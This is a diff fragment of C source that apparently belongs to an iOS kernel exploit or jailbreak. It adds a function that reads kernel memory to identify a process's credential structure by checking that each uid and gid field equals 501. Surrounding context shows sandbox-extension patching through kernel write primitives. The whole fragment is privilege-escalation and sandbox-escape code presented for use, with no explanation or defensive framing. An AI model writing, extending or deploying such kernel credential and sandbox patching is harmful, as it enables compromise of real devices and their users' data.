@@ -2232,6 +2232,20 @@ static void sbx_patchext(uint64_t ext) {
     kwrite_buf(ext + OFF_EXT_DATA, chunk, 0x20);
 }
 
+// How lara confirms we have a valid ucred: the .uid field is always 501 at
+// this point. Only if so do we proceed to patch.
+// PROBLEM: the earlier builds used 0x28 as the p_ucred offset blindly. The
+// ioEntity checks below only return TRUE if we're already root.
+static bool looks_ucred_iOS18(uint64_t ucred) {
+    return looks_kernel(ucred)
+        && kread32(ucred + 0x18) == 501   /* cr_uid */
+        && kread32(ucred + 0x1c) == 501   /* cr_ruid */
+        && kread32(ucred + 0x20) == 501   /* cr_svuid */
+        && kread32(ucred + 0x24) == 501   /* cr_gid */
+        && kread32(ucred + 0x28) == 501   /* cr_rgid */
+        && kread32(ucred + 0x2c) == 501;  /* cr_svgid */
+}
+
 static int sbx_patchchain(uint64_t hdr) {
     int n = 0;
     for (int i = 0; i < 64 && looks_kernel(hdr); i++) {
